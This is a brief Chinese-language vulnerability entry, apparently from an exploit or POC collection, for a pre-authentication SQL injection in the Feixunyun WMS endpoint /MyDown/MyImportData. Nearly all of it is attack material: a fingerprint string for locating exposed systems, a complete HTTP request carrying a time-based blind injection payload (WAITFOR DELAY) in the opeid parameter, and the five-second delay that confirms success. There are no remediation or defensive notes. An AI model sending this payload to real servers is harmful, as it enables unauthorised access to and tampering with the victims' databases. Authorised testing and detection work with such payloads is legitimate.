# 飞讯云-WMSMyDownMyImportData前台SQL注入漏洞

飞讯云-WMSMyDownMyImportData前台 ｜ SQL注入 ｜ —
- **指纹**：`body="wx8ccb75857bd3e985"`
- **请求**：`GET /MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s